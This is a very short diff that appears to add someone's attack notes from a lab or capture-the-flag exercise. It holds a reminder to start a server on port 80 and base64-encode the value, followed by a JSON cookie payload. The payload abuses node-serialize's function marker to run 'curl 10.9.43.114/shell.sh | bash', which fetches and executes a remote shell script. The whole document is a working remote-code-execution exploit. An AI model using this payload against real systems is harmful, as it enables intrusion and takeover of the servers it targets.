@@ -1,0 +1,4 @@
+
+first i need to start server on 80 and then encode url to base64
+
+{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.9.43.114/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":false}
